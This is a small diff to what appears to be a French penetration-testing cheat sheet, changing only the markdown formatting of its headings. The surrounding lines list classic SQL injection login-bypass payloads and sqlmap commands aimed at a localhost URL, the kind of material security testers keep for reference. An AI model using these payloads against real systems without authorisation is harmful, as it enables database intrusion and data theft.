@@ -90,7 +90,7 @@ Injections
 
 SQL INJECTIONS
 ======
-Tests classiques
+**Tests classiques**
 * ' or 1=1 LIMIT 1 --
 * ' or 1=1 LIMIT 1 -- -
 * ' or 1=1 LIMIT 1#
@@ -100,7 +100,8 @@ Tests classiques
 * admin\'-- -
 
 <br/>
-SQLMap - Cheatsheet
+
+**SQLMap - Cheatsheet**
 
 * **POST :** sqlmap -r req.txt -p pass
 * **GET :** sqlmap -u "http://127.0.0.1/index.php?id=1" --dbs
